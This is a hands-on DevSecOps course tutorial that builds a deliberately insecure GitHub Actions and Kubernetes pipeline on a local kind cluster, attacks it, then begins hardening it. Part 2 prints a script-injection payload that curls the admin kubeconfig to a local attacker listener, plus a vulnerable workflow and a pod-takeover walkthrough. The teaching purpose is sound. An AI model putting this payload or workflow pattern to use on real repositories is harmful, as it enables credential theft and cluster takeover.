# DevSecOps Lab — Full Tutorial (everything in one file)

This single document is the whole course, end to end: machine setup, the learning
plan, all four hands-on parts (including the step-by-step explanation of **how each
attack works**), troubleshooting, and a glossary. Read it top to bottom, or jump
with the table of contents. **Every command is copy-paste ready.**

> Assembled from `STUDY_GUIDE.md`, `GUIDE.md`, and the `labs/part1-4.md` files —
> those still exist on their own; this is the merged reading copy. Setup lives in
> "Getting started"; if anything breaks, jump to the Appendix or run `make doctor`.

## Contents

1. **Getting started** — what you build, machine setup, the plan
2. **Part 1** — build a plain CI/CD pipeline
3. **Part 2** — attack it (how each hack works, then the exact lab steps)
4. **Part 3** — make it DevSecOps (close every hole)
5. **Part 4** — detect & respond, with AI
6. **Appendix** — troubleshooting, scenarios & glossary

---

# Getting started

**Read this first.** It is the single on-ramp for this course. If you have
never touched Kubernetes, CI/CD, or security tooling, you are in the right
place — this guide assumes **nothing** and walks you from an empty laptop to a
working, attacked, hardened, self-defending pipeline.

You do **not** need a cloud account, a credit card, or a server. Everything
runs on your own computer on a real (but local) Kubernetes cluster.

---

## 1. What you are going to build (the big picture)

You will build one small app's pipeline four times over, each time learning a
new job:

```
 PART 1            PART 2            PART 3              PART 4
 build             attack            govern             detect & respond
 ─────────         ─────────         ─────────          ─────────────────
 a plain           break it like     close every        audit log + AI
 CI/CD pipeline    an attacker       hole you found     incident & triage
 (works, but       (steal creds,     (OIDC, signing,    (something tells you
  insecure)         own the pod)      policy, scans)      when it's bypassed)
```

The idea that makes this course different: **you attack the pipeline before you
secure it.** By the time you add a control in Part 3, you have already seen the
exact attack it stops — so nothing feels abstract.

- **22 labs** across 4 parts (`labs/part1.md` → `labs/part4.md`)
- **10 case scenarios** to practise afterward (`scenarios/`)
- The app itself is tiny (a notes API). Everything you learn is the pipeline
  *around* it — which is what real jobs are about.

> **See the map before you start.** Open
> [`docs/architecture.md`](docs/architecture.md) — it draws the plain Part 1
> pipeline and the full DevSecOps pipeline side by side. Or open
> [`docs/architecture.drawio`](docs/architecture.drawio) at
> [app.diagrams.net](https://app.diagrams.net) for the version with real tool
> logos.

---

## 2. Who this is for / what you need to know

**Required knowledge: none.** If you can open a terminal and copy-paste a
command, you can finish this. Where a term is new, this guide explains it.

What helps but isn't required: having seen a terminal before, and knowing that
"git" stores code history. That's it.

**A note on "it won't work exactly on my machine."** That is expected — people
run macOS, Linux, and Windows, with different versions of things. This guide is
built for that: every step has a **"you're done when"** check so you always
know whether it worked, and Section 7 is a troubleshooting playbook for when it
didn't. Nearly every tool runs as a **container**, so your machine's own
software versions mostly don't matter — Docker gives everyone the same
environment.

---

## 3. Set up your machine (do this once)

You install only **eight** things. Every scanner (Trivy, Gitleaks, Semgrep, OPA,
ZAP, Kubescape, kube-bench…) runs as a container, so you never install those.

| Tool | What it is | Why you need it |
|------|-----------|-----------------|
| **Docker** | runs containers | the engine everything else rides on |
| **kind** | Kubernetes-in-Docker | your local cluster (no cloud) |
| **kubectl** | the Kubernetes client | you talk to the cluster with it |
| **git** | version control | the labs are a git repo |
| **make** | command runner | every lab step is a `make` target |
| **gh** | GitHub CLI | creates your repo, logs you in |
| **python3** | Python | runs the attacker box (Part 2) and the detector (Part 4) |
| **cosign** | image signing | the Part 3 pipeline signs and verifies images on your machine |

### Install

**macOS** (needs [Homebrew](https://brew.sh)):
```bash
brew install --cask docker        # then open Docker Desktop once, let it start
brew install kind kubectl git make gh python3 cosign
```

**Linux (Debian/Ubuntu):**
```bash
# docker: follow https://docs.docker.com/engine/install/ for your distro
# (libicu-dev: the GitHub Actions runner from Lab 4 needs it)
sudo apt-get update && sudo apt-get install -y git make python3 curl libicu-dev
# kind (pinned: must be >= KIND_VERSION in tools.env; ARM machines: kind-linux-arm64):
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.33.0/kind-linux-amd64 && sudo install kind /usr/local/bin/ && rm kind
# kubectl:
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && sudo install kubectl /usr/local/bin/
# cosign (Part 3 image signing):
curl -Lo cosign https://github.com/sigstore/cosign/releases/download/v3.1.4/cosign-linux-amd64 && sudo install cosign /usr/local/bin/ && rm cosign
# gh: https://github.com/cli/cli#installation
```

**Windows:** do **not** run the labs in PowerShell — they assume a Linux shell.
The supported, recommended path is **WSL2**. Follow **Section 3b** just below,
then come back and run the **Linux** install steps *inside* your WSL terminal.

### Requirements

- **~8 GB of free RAM** (the cluster + scanners need room). Close heavy apps.
- Docker must be **running** before you start (open Docker Desktop, or start
  the engine on Linux).

### Verify — you're done with setup when every line prints a version

```bash
docker version        # a server version, not "cannot connect" → Docker is running
kind version          # v0.33 or newer
kubectl version --client
git --version
make --version
gh --version
gh auth status        # must say "Logged in". If not: gh auth login
python3 --version
cosign version
```

Once you have the repo (Section 4), `make doctor` re-checks all of this —
plus Docker memory, the kind version and free ports — and prints the fix.

If any line errors, fix that one tool before moving on — Section 7 has help.

### 3b. Running on Windows — the recommended way (WSL2)

This whole course is Linux shell + Docker + kind. On Windows you run it inside
**WSL2** (Windows Subsystem for Linux) — a real Linux environment Windows runs
for you. It works well here *because* the course uses a self-hosted runner and a
local cluster, so GitHub never has to reach into your machine over the internet
— the part that normally makes Windows painful. Do this once:

**1. Install WSL2 + a distro** (PowerShell as Administrator, one time):
```powershell
wsl --install -d Ubuntu
```
Reboot if it asks, then open **Ubuntu** from the Start menu and create your
Linux username/password. From now on, everything happens in this Ubuntu
terminal — never PowerShell.

**2. Install Docker Desktop and turn on WSL integration.**
Install Docker Desktop for Windows, then: **Settings → Resources → WSL
Integration → enable your Ubuntu distro**. This lets `docker` and `kind` work
*inside* WSL. Make sure Docker Desktop is running before any lab.

**3. Give WSL enough memory.** The cluster + scanners need ~8 GB. Create the
file `C:\Users\<you>\.wslconfig` (in Windows) with:
```ini
[wsl2]
memory=8GB
processors=4
```
Then in PowerShell: `wsl --shutdown`, and reopen Ubuntu. (16 GB of laptop RAM is
comfortable; 8 GB is the tight minimum.)

**4. Work inside the Linux home, NOT the Windows drive.** Clone and run under
`~/practice-lab-<name>` in WSL — never under `/mnt/c/...`. Docker + kind on the
Windows drive is slow and hits file-permission errors. (You can still browse
the files from Windows Explorer at `\\wsl$\Ubuntu\home\<you>` if you want.)

**5. Now go back to the Linux install block above** and run it in your Ubuntu
terminal, then continue to the verify step and Section 4.

**Windows-specific troubleshooting:**

| Symptom | Fix |
|---------|-----|
| `docker: command not found` in WSL | Docker Desktop not running, or WSL integration off (step 2) |
| `make up` is painfully slow or errors on files | you're under `/mnt/c/...`; move the project into `~/` (step 4) |
| `make up` fails with `old API spec: kubeadm.k8s.io/v1beta3` | kind is too old for the node image — `make doctor` prints the upgrade command |
| `port 6443 is already in use` | Docker Desktop's own Kubernetes is on: Settings → Kubernetes → disable it |
| `bad interpreter: ...^M` or `missing separator` | files got Windows line endings — clone inside WSL, not with Windows git |
| cluster unhealthy / OOM | raise WSL memory in `.wslconfig` (step 3), `wsl --shutdown`, retry |
| signing / OIDC / TLS fails with weird time errors | clock drift after sleep — run `wsl --shutdown` and reopen, or `sudo hwclock -s` |
| `curl localhost:8080` works in WSL but not from a Windows browser | run the `curl` *inside* WSL (that's what the labs do); it shares WSL's localhost |

Everything else in this guide — every `make` target, every scanner, OIDC, the
CIS benchmark — behaves the same in WSL2 as on macOS or Linux, because the tools
all run as containers.

### (Optional) AI credential for Part 4

Part 4 uses Claude to triage findings and write incident reports. If you have
an `ANTHROPIC_API_KEY`, export it. **Without one you can still do Part 4** — the
AI tools print the exact prompt they *would* send, so you follow along and see
the inputs, just without the generated answer.

---

## 4. The one-time project setup (Labs 0–2)

GitHub only runs pipelines from the **root** of a repository, so your first job
is to turn this course folder into your own private repo. Name it `practice-lab-<name>`
(e.g. `practice-lab-alice`) so it never clashes with the course repo `devsecops-lab-devopswithkosa`.

```bash
# 1. Get the course, then copy it into its own folder as a fresh git repo
NAME=yourname   # your first name, lowercase, e.g. alice
git clone https://github.com/DevOpswith-Kosa/devsecops-lab-devopswithkosa.git ~/devsecops-course
~/devsecops-course/scripts/new-lab-repo.sh ~/practice-lab-$NAME
cd ~/practice-lab-$NAME

# 2. Create YOUR private GitHub repo and push to it
gh repo create practice-lab-$NAME --private --source . --push

# 3. Check the machine, then bring up the local platform (1–3 min)
make doctor
make up
make status
```

**You're done when** `make status` shows the registry and the cluster with a ✔,
and two namespaces (`dev`, `prod`) exist. That is your insecure baseline.

> **You can stop and resume any time.** `make down` deletes the cluster and
> registry (your files and repo are untouched). A clean restart is always
> `make down && make up`.

From here on, **always work inside `~/practice-lab-<name>`.**

---

## 5. The learning plan — four parts, checkpointed

Work through the parts **in order** — the whole point is that each part needs
the one before it. Each lab file holds the exact commands; this section tells
you the goal, the time, and how to know you finished.

Legend: ⏱ rough time · 🎯 the checkpoint that proves you're done.

### Part 1 — Build a plain CI/CD pipeline → `labs/part1.md`
**You play:** a platform engineer. **⏱ ~2 hours.**
Get code from a commit to a running pod, automatically — with **no** security
yet. You build the "happy path" so later parts have something real to attack
and harden.

- Build, test, and deploy the app by hand (`make test build push deploy-insecure`)
- Wire it into GitHub Actions with a self-hosted runner
- See the deliberate weaknesses: admin kubeconfig, mutable `:dev` tag, root pod

🎯 **Done when:** a `git push` automatically lands a running pod, and
`curl localhost:8080/version` answers from the cluster.

### Part 2 — Attack it → `labs/part2.md` + `attack/`
**You play:** the attacker. **⏱ ~2–3 hours.**
Break the pipeline you just built, the way a real attacker would. **Only ever
against your own local cluster.**

- **A1** — command injection in the CI workflow → steal the kubeconfig
- **A2** — use the stolen credential to `kubectl exec` into a pod and own it
- **A3** — swap the running image using the mutable tag

🎯 **Done when:** you have a stolen kubeconfig in `attack/loot/` and have
changed what's running in the cluster *without going through the pipeline*. Run
`attack/reset.sh` to restore a clean state before Part 3.

> These are intentionally vulnerable exercises. They target **only** your own
> kind cluster; the "attacker server" is `localhost`. Never point them at
> anything you don't own.

### Part 3 — Govern (make it DevSecOps) → `labs/part3.md`
**You play:** a DevSecOps engineer. **⏱ ~4–5 hours (the biggest part).**
Close every hole from Part 2. Crucially, **each control answers an attack you
already ran.**

- Shift-left scans: secrets, SAST, dependency CVEs, IaC, image CVEs, K8s config
  (`make scan`, `scan-config`)
- **OIDC federation** — GitHub authenticates to the cluster with a short-lived
  token, so there's no stored kubeconfig left to steal (kills A1)
- **Pod Security + OPA Gatekeeper** — the cluster refuses root/privileged pods
  (kills A2)
- **cosign signing + deploy-by-digest** — only signed, exact images run
  (kills A3)
- Benchmark the cluster against CIS (`make cis`) and dynamically scan the
  running app (`make dast`)

🎯 **Done when:** `make scan` is green, Gatekeeper **denies** the insecure
deploy, and a signed image deploys by digest and serves (`make deploy ENV=dev`).

### Part 4 — Detect & respond (with AI) → `labs/part4.md`
**You play:** an SRE / incident responder. **⏱ ~2–3 hours.**
Controls can still be bypassed — so now something watches and tells you.

- Read the Kubernetes API **audit log** (`make audit`)
- Run the detector to turn raw logs into attack signals (`make detect`)
- Let Claude **triage** findings and write an **incident report**
  (`make triage`, `make incident`) — and diagnose a broken build
  (`make ai-doctor`)

🎯 **Done when:** you re-run a Part 2 attack, the detector flags it in
`detect/findings.json`, and you produce a readable incident report from it.

---

## 6. Suggested schedules

Pick the pace that fits you. All three cover the same 22 labs.

**A weekend sprint (two long days)**
- Day 1: Setup + Part 1 + Part 2
- Day 2: Part 3 + Part 4, then one scenario

**A calm six-week plan (a few hours a week) — good for a study group**
| Week | Focus |
|------|-------|
| 1 | Setup (Sections 3–4) + Part 1 |
| 2 | Part 2 (the attacks) |
| 3 | Part 3 — scans + OIDC |
| 4 | Part 3 — Pod Security, Gatekeeper, signing, CIS, DAST |
| 5 | Part 4 — detection + AI |
| 6 | Case scenarios, review, break something on purpose |

**Workshop format (facilitator + group):** everyone does Setup + Part 1
together, then hand **one `scenarios/` case per pair** — each is a
self-contained "something's wrong, find and fix it" story (details below).

---



---

# Part 1 — A plain CI/CD pipeline

**Goal:** get code from a commit to a running pod in kind, automatically. No
security gates yet. We build the "happy path" first so Part 2 has something
real to attack and Part 3 has something real to harden.

> **How to read these labs.** Each lab has a short *What you're doing / why*
> note, then a command block you can copy-paste, then *what you should see*.
> Run the commands in order, in your WSL/Linux/macOS terminal, from inside
> `~/practice-lab-<name>`. If anything errors, run `make doctor` first.

---

## Lab 0 — Prerequisites

**What you're doing:** checking that the eight tools the course needs are
installed. You only install these eight; every *scanner* later (Trivy, Semgrep,
Gitleaks, ZAP…) runs as a container, so you never install those.

| Tool | What it is / why it's here |
|---|---|
| **docker** | runs containers — the engine everything else rides on |
| **kind** | "Kubernetes IN Docker" — your real cluster, running locally, no cloud |
| **kubectl** | the command you talk to Kubernetes with |
| **git** | version control; the labs and the pipeline are driven by git |
| **make** | the command runner — every lab step is a `make <target>` |
| **gh** | GitHub CLI — creates your repo, logs you in, sets secrets |
| **python3** | runs the Part 2 attacker box and the Part 4 detector |
| **cosign** | signs and verifies container images (Part 3) |

Each command below just prints a version — if one errors, that tool is missing:

```bash
docker version        # Docker running
kind version          # >= 0.33
kubectl version --client
git --version
make --version
gh --version          # GitHub CLI, logged in: gh auth login
python3 --version     # Part 2 attacker box, Part 4 detector
cosign version        # Part 3: the pipeline signs images on your machine
```

Then, from the repo folder, `make doctor` checks all of it (plus Docker
memory and free ports) and prints the exact fix for anything wrong.

Install anything missing (macOS: `brew install kind kubectl gh make python3 cosign`; Linux/WSL: see
`STUDY_GUIDE.md` section 3). You do
**not** install trivy/semgrep/gitleaks/etc. — they run as containers.

---

## Lab 1 — Make the lab your own repository

**What you're doing:** copying the course into a brand-new git repo of your own
and pushing it to GitHub. **Why:** GitHub only runs pipeline workflows from the
**root** of a repository, and later labs register a runner and set secrets on
*your* repo — so you need your own copy, not the shared course folder.

```bash
NAME=yourname   # your first name, lowercase, e.g. alice
git clone https://github.com/DevOpswith-Kosa/devsecops-lab-devopswithkosa.git ~/devsecops-course
~/devsecops-course/scripts/new-lab-repo.sh ~/practice-lab-$NAME
cd ~/practice-lab-$NAME
gh repo create practice-lab-$NAME --private --source . --push
```

- `git clone` downloads the course.
- `NAME=...` sets your name once. Your folder and your GitHub repo are both
  called `practice-lab-<name>` (e.g. `practice-lab-alice`), so every learner's
  copy is clearly separate from the course repo `devsecops-lab-devopswithkosa`.
- `new-lab-repo.sh` copies it into `~/practice-lab-<name>` as a fresh git repo (no
  course history).
- `gh repo create … --source . --push` makes a **private** GitHub repo and
  pushes your copy to it.

From now on, work in `~/practice-lab-<name>`.

---

## Lab 2 — Bring up the platform

**What you're doing:** starting the two pieces of local infrastructure the
pipeline needs — a **container registry** (where built images are stored) and a
**kind cluster** (where they run).

```bash
make up        # creates the local registry + the kind cluster (1–3 min)
make status
```

- `make up` starts a registry at `localhost:5001` and a one-node Kubernetes
  cluster, then creates two **namespaces** (isolated areas) called `dev` and
  `prod`.
- `make status` is your dashboard: it should show the registry and cluster as
  ✔.

Those two namespaces start with **no** security restrictions — that is the
insecure baseline Part 2 relies on.

Look at what `make up` did: open `platform/up.sh`. Notice the cluster is created
with a fixed API address (`127.0.0.1:6443`) and an **audit log** (a record of
everything done to the cluster) — you'll use both later.

---

## Lab 3 — Build, test and deploy by hand

**What you're doing:** running the pipeline's stages yourself, one command at a
time, before you automate them — so the pipeline holds no mystery. This is the
core loop of CI/CD: **test → build → ship → run.**

```bash
make test                     # pytest in a container
make build push               # build the image, push to localhost:5001, print its digest
make deploy-insecure          # apply the (insecure) Part 1 manifests to dev with YOUR kubeconfig
make status                   # dev should show the image and "ready 1/1"
curl localhost:8080/version   # the app, served from the cluster
curl -XPOST localhost:8080/api/notes -H 'content-type: application/json' -d '{"title":"hello"}'
curl localhost:8080/
```

What each step is:

- `make test` runs the unit tests (**pytest**) inside a throwaway Python
  container — same result on any machine.
- `make build push` builds the container image, pushes it to your local
  registry, and prints its **digest** (a `sha256:…` hash — the image's exact
  fingerprint; remember this, Part 3 deploys *by* digest).
- `make deploy-insecure` applies the Part 1 Kubernetes manifests to the `dev`
  namespace, so the app starts running in the cluster.
- The `curl` commands talk to the running app on `http://localhost:8080`.

Read `ci/render.sh` and `k8s/insecure/` to see exactly what was deployed.

> The Part 1 deployment (`k8s/insecure/`) is weak on purpose — root, writable
> filesystem, an over-privileged ServiceAccount token mounted in the pod, no
> limits, a mutable `:dev` tag. Every one of those is a door Part 2 walks
> through and Part 3 closes. Read the `(!)` comments in that file now.

---

## Lab 4 — Put a self-hosted runner on your machine

**What a runner is:** the machine that actually executes a GitHub Actions
workflow. GitHub's *cloud* runners can't reach a cluster that only exists on
your laptop — so you register a **self-hosted runner**, which runs the workflow
*on your machine*, where it can reach your cluster. (That convenience is also
Part 2's first target: a runner executes whatever a workflow tells it to.)

```bash
make runner-install REPO=<your-gh-user>/practice-lab-<name>
make runner-start
make status           # "self-hosted runner: ✔ running"
```

- `runner-install` downloads and registers the runner against your repo (it
  uses `gh` for a one-time token).
- `runner-start` runs it in the background, waiting for jobs.

---

## Lab 5 — The automated pipeline (insecure)

**What you're doing:** letting GitHub run the whole test→build→push→deploy loop
for you on every push. The workflow file `.github/workflows/10-ci-insecure.yml`
describes those steps.

First the pipeline needs a credential to reach your cluster. For now that is a
long-lived admin **kubeconfig** stored as a GitHub **secret** (Part 3 replaces
this with something far safer):

```bash
kubectl --context kind-devsecops config view --raw --minify --flatten \
  | gh secret set KUBECONFIG_ADMIN
```

That command exports your cluster credential and pipes it into a repo secret
named `KUBECONFIG_ADMIN`. Now trigger the pipeline with an empty commit:

```bash
git commit --allow-empty -m "trigger the pipeline"
git push
gh run watch
```

- `git push` sends the commit to GitHub, which starts the workflow.
- `gh run watch` streams the run live in your terminal.

Watch it build and deploy to `dev`. `make status` shows the new version.

It is the only workflow that runs for now: the secure pipelines wait in
`ci/workflows/` until you turn them on in Part 3 (Lab 14).

**You now have CI/CD.** Read `10-ci-insecure.yml` top to bottom — every line
marked `(!)` is a weakness. In Part 2 you exploit them.

---

### What you built

- a reproducible build (pinned deps, a multi-stage Dockerfile, a non-root image)
- a local registry as the artifact store
- a kind cluster with dev/prod namespaces
- a pipeline that deploys on every push

### What's wrong with it (the Part 2 preview)

- the runner executes on your machine with broad access
- the cluster credential is a long-lived, all-powerful secret
- nothing scans the code, dependencies, image, or manifests
- the deployment runs as root with a powerful token inside the pod
- images deploy by a **mutable tag**, so "what's running" can change silently

→ Continue to **`labs/part2.md`** and attack it.


---

# Part 2 — Attack it: how each hack works, step by step

This is the chapter students ask about most, so here is **how each attack
actually works**, not just the command to run. Full command list:
[`labs/part2.md`](labs/part2.md). Read [`attack/README.md`](attack/README.md)
first.

Each attack maps to an OWASP CI/CD Top-10 risk and is fixed later in Part 3.

### 4.0 The attacker box

```bash
attack/attacker-box.sh start      # listens on 127.0.0.1:9000, saves to attack/loot/
```

This is a stand-in for "the attacker's server on the internet." It is a tiny
Python HTTP server that writes **anything sent to it** into `attack/loot/` with
a timestamp. In a real breach this box would be on the internet; the mechanism
is identical. Keeping it on `127.0.0.1` is what makes this safe to practise.

---

### 4.1 Attack A1 — poison the pipeline, steal the cluster credential
**OWASP CICD-SEC-4 (Poisoned Pipeline Execution) + SEC-6 (insufficient credential hygiene).**

This is the headline attack: **one GitHub issue title steals a full
cluster-admin credential.** Here is the whole chain.

**The vulnerable code.** Part 2 adds a "ChatOps" bot
(`attack/workflows/90-chatops-vulnerable.yml`): open an issue whose title
starts with `/status` and it reports cluster status. To do that it keeps the
admin kubeconfig in the job's environment, and — the bug — it drops the
issue **title** straight into a shell:

```yaml
run: |
  echo "Running command: ${{ github.event.issue.title }}"
  echo "$KUBECONFIG_ADMIN" > /tmp/kc && export KUBECONFIG=/tmp/kc
  kubectl -n dev get pods || true
```

GitHub Actions substitutes `${{ github.event.issue.title }}` into the script
**as text, before the shell runs.** So whatever you type as the title becomes
part of the command.

**Step 1 — see the breakout locally (Lab 6), no GitHub needed.** The payload
(`attack/a1-pipeline-injection/payload.txt`) is:

```
/status"; curl -s --data-binary "$KUBECONFIG_ADMIN" http://127.0.0.1:9000/kubeconfig ; echo "
```

Read it as the shell does. The workflow line becomes:

```sh
echo "Running command: /status"; curl -s --data-binary "$KUBECONFIG_ADMIN" http://127.0.0.1:9000/kubeconfig ; echo ""
```

The `";` **closes the `echo`** and starts a new command. That new command
`curl`s the secret kubeconfig to the attacker box. The trailing `; echo "`
swallows the leftover quote so nothing looks broken. `prove-injection-locally.sh`
runs this exact line with a fake secret so you watch the request hit your
attacker box — proof of the breakout before you ever touch GitHub.

**Step 2 — arm it (Lab 7).** Copy `90-chatops-vulnerable.yml` into
`.github/workflows/` and push. The bot is now live on your repo.

**Step 3 — fire it (Lab 8).** `attack/a1-pipeline-injection/exploit.sh` opens an
issue whose **title is the payload**. GitHub sees a new issue → triggers the
workflow → your self-hosted runner executes the injected `curl` → the admin
kubeconfig lands in `attack/loot/`. Watch it arrive:

```bash
attack/attacker-box.sh tail      # the kubeconfig arrives
ls attack/loot/                  # the stolen credential, on disk
cp attack/loot/*kubeconfig* /tmp/stolen-kubeconfig
```

**What you proved.** An attacker who can only *open an issue* — no write access,
no secrets — just walked away with a **full, non-expiring cluster-admin
credential.** Two mistakes combined: untrusted input in a shell (SEC-4) and a
long-lived all-powerful secret sitting in the job (SEC-6).

> **Fixed in Part 3:** Lab 13 removes the injection (pass input through `env:`,
> never into a shell). Lab 12 removes the *prize* — no long-lived kubeconfig
> exists any more; the pipeline authenticates with short-lived OIDC tokens.

---

### 4.2 Attack A2 — own the workload, then the namespace
**OWASP CICD-SEC-6.**

Now use that stolen credential (or the admin one, while learning) against the
**running pod.** The Part 1 deployment runs as root, has a writable filesystem,
and mounts an over-privileged ServiceAccount token.

```bash
attack/a2-pod-compromise/exploit.sh /tmp/stolen-kubeconfig dev
```

The script walks the full takeover, step by step:

1. **Who am I?** `exec` into the pod and run `id` → `uid=0(root)`. The container
   runs as root, so a code-exec bug in the app is instantly root-in-container.
2. **Steal the token.** Read
   `/var/run/secrets/kubernetes.io/serviceaccount/token` — the pod's mounted
   ServiceAccount token. Part 1 mounts it even though the app never uses it.
3. **What can the token do?** `kubectl --token=<stolen> auth can-i --list` —
   Part 1 gave this ServiceAccount `*` on `*`: it can do almost **anything in
   the namespace.**
4. **Read secrets** with the stolen token.
5. **Persistence** — launch a **new rogue pod** (stand-in for a crypto-miner or
   reverse shell) using the stolen token.
6. **Proof** — write `/owned.txt` inside the app's **writable** root filesystem.

A foothold in one pod became control of the whole namespace, because the
workload handed over the keys.

> **Fixed in Part 3:** Lab 11 hardens the workload (non-root, read-only FS,
> `automountServiceAccountToken: false` → **no token to steal**, tight RBAC).
> Lab 15 enforces Pod Security `restricted` cluster-wide; Lab 16 adds Gatekeeper
> admission so a rogue pod is refused.

---

### 4.3 Attack A3 — swap the image without touching git
**OWASP CICD-SEC-5 (artifact integrity).**

The Part 1 pipeline deploys the **mutable tag** `:dev`. Anyone who can push to
the registry can replace what `:dev` points at — no pull request, no pipeline,
no trace in git.

```bash
attack/a3-image-tampering/exploit.sh dev
```

Step by step the script:

1. Builds a **backdoored image** (`Dockerfile.backdoor` — the real app plus a
   planted `/BACKDOOR` file) and **pushes it over the same `:dev` tag.**
2. Restarts the deployment so it pulls the swapped image.
3. Proves the running pod is now the attacker's build (`cat /BACKDOOR`).

"What is deployed" is no longer "what you reviewed." The tag lied.

> **Fixed in Part 3:** Lab 11/CD deploys by **digest** (a hash of the exact
> bytes — it cannot be moved). Lab 17 **signs** each image with cosign and
> **verifies** the signature before deploy. Lab 16 has Gatekeeper require a
> digest in `prod`, so nobody can `kubectl set image …:hotfix` around the
> pipeline.

---

### 4.4 Clean up

```bash
attack/reset.sh                   # remove rogue pod, marker files, loot/
attack/attacker-box.sh stop
```

Keep the vulnerable ChatOps workflow for now — Part 3 deletes it in Lab 13, and
in Part 4 you re-run these attacks against the hardened cluster to watch them
**fail or get caught.**

### The scoreboard

| Attack | OWASP CI/CD | The lesson |
|---|---|---|
| A1 injection → stolen kubeconfig | SEC-4, SEC-6 | untrusted input in a pipeline = remote code execution; long-lived creds = total loss |
| A2 pod & namespace takeover | SEC-6 | a weak workload hands the cluster to anyone who reaches it |
| A3 image swap | SEC-5 | mutable tags mean "deployed" ≠ "reviewed" |

---



---

# Part 2 — the exact copy-paste lab steps

> **Only ever against your own cluster.** Everything here targets your kind
> cluster and a listener on `127.0.0.1`. Nothing leaves your machine. You do
> this to understand the defences in Part 3 — read `attack/README.md` first.

**What this part is:** you have a working pipeline; now you prove it isn't safe.
Three attacks, each mapping to an OWASP CI/CD Top-10 risk, each fixed later in
Part 3. For the *why each attack works* explanation in plain English, see
[`../GUIDE.md`](../GUIDE.md) section 4 — this file is the hands-on version.

**The attacker box.** First start a stand-in for "the attacker's server":

```bash
attack/attacker-box.sh start      # listens on 127.0.0.1:9000, saves to attack/loot/
```

It is a tiny web server that writes **anything sent to it** into `attack/loot/`.
When a stolen secret shows up there, you've proven the exfiltration worked. It
stays on `127.0.0.1`, which is what makes practising this safe.

---

## Lab 6 — See the injection mechanism (no GitHub needed)

**What you're doing:** proving the core bug locally, with a *fake* secret,
before wiring up the real pipeline. **The bug:** a workflow drops an
attacker-controlled issue **title** straight into a shell command.

```bash
cat attack/a1-pipeline-injection/payload.txt
attack/a1-pipeline-injection/prove-injection-locally.sh
```

- The first command shows you the payload (a crafted issue title).
- The second runs the *exact* shell line the vulnerable workflow would run, with
  a fake secret, so you watch the breakout happen.

The payload is `/status"; <commands> ; echo "`. The `";` **closes** the
workflow's `echo` and starts a new command of the attacker's choosing — here, a
`curl` that sends the secret to your attacker box. This is **script injection**
(OWASP CICD-SEC-4). You should see a request land in `attack/loot/`.

---

## Lab 7 — Arm the vulnerable workflow

**What you're doing:** copying the deliberately-vulnerable "ChatOps" workflow
into your repo and pushing it, so GitHub will run it.

```bash
cp attack/workflows/90-chatops-vulnerable.yml .github/workflows/
git add .github/workflows/90-chatops-vulnerable.yml
git commit -m "add chatops bot"
git push
```

Read it: it keeps the admin kubeconfig in the job environment "to report
cluster status", and interpolates the issue title. Both are real, common
mistakes.

---

## Lab 8 — A1: poison the pipeline, steal the cluster credential

**What you're doing:** firing the attack for real. You open a GitHub issue whose
**title is the payload**. GitHub triggers the workflow → your self-hosted runner
executes the injected command → it exfiltrates the admin kubeconfig to your
attacker box.

```bash
attack/a1-pipeline-injection/exploit.sh     # opens the crafted issue via gh
attack/attacker-box.sh tail                 # watch the kubeconfig arrive
ls attack/loot/                             # the stolen credential
```

- `exploit.sh` opens the issue (it only *opens* it; the runner does the rest).
- `attacker-box.sh tail` streams the attacker box log — watch the kubeconfig
  appear (press Ctrl-C to stop watching).

You (as the attacker) now hold a **full cluster-admin kubeconfig** that never
expires. This is the worst case, and it came from one issue title. Save it to
use as the attacker in the next lab:

```bash
cp attack/loot/*kubeconfig* /tmp/stolen-kubeconfig
```

---

## Lab 9 — A2: own the workload and the namespace

**What you're doing:** using the stolen credential against the running pod. The
Part 1 deployment runs as **root**, has a **writable filesystem**, and mounts an
**over-privileged ServiceAccount token** — the script abuses all three.

```bash
attack/a2-pod-compromise/exploit.sh /tmp/stolen-kubeconfig dev
```

Step by step it shows: you are **root** in the container; you can read the
**mounted SA token**; that token can do almost anything in the namespace
(Part 1 gave it `*` on `*`); you use it to **read Secrets** and **launch a
rogue pod**; and you write a file to the app's **writable root filesystem** as
proof. A real attacker drops a miner or a reverse shell at that last step.

---

## Lab 10 — A3: swap the image without touching git

**What you're doing:** replacing what's running without any pull request or
pipeline run. The Part 1 pipeline deploys the **mutable** tag `:dev`; anyone who
can push to the registry can change what `:dev` points at.

```bash
attack/a3-image-tampering/exploit.sh dev
```

It builds a backdoored image, pushes it over `:dev`, restarts the deployment,
and proves the running pod is now the attacker's build. This is why "deploy by
tag" is unsafe and why Part 3 deploys by **digest** and **verifies a
signature**.

---

## Clean up

**What you're doing:** removing the attack artifacts (rogue pod, marker files,
loot) so you can replay or move on cleanly.

```bash
attack/reset.sh
attack/attacker-box.sh stop
```

---

### What you proved

| Attack | OWASP CICD | The lesson |
|--------|-----------|------------|
| A1 injection → stolen kubeconfig | SEC-4, SEC-6 | untrusted input in a pipeline = RCE; long-lived creds = total loss |
| A2 pod & namespace takeover | SEC-6 | a weak workload hands the cluster to anyone who reaches it |
| A3 image swap | SEC-5 | mutable tags mean "what's deployed" is not "what you reviewed" |

Keep the vulnerable workflow for now. In Part 3 you'll fix each hole and, in
Part 4, re-run these attacks to watch them fail or get caught.

→ Continue to **`labs/part3.md`**.


---

# Part 3 — Make it a DevSecOps pipeline

Now close every door Part 2 walked through. **Each lab is one control**, and
each control maps to an attack you just ran — after each one, re-run the
matching attack and watch it fail.

Everything here is a `make` target that runs the **same** containerised
scanner locally and in CI, so "green on my laptop" means "green in the
pipeline".

> **The tools you'll meet in this part** (all run as containers — nothing to
> install except cosign):
>
> | Tool | Kind of check | What it looks at |
> |---|---|---|
> | **Gitleaks** | secrets | passwords/keys anywhere in git history |
> | **Semgrep / Bandit** | SAST (static code) | insecure code patterns |
> | **Trivy** | SCA + image + config | known CVEs in deps & image, misconfig |
> | **Hadolint** | lint | Dockerfile mistakes |
> | **Conftest / OPA** | policy | your own rules on the manifests |
> | **Gatekeeper** | admission | blocks bad resources *at* the cluster |
> | **Kubescape** | benchmark | manifests vs NSA-CISA + MITRE |
> | **kube-bench** | benchmark | the cluster vs the CIS Benchmark |
> | **cosign** | signing | proves an image came from your pipeline |
> | **OWASP ZAP** | DAST (dynamic) | the *running* app over HTTP |
>
> "Shift-left" means running a check early (on your laptop / in CI) instead of
> waiting for something to go wrong in production.

---

## Lab 11 — Harden the workload  *(closes A2)*

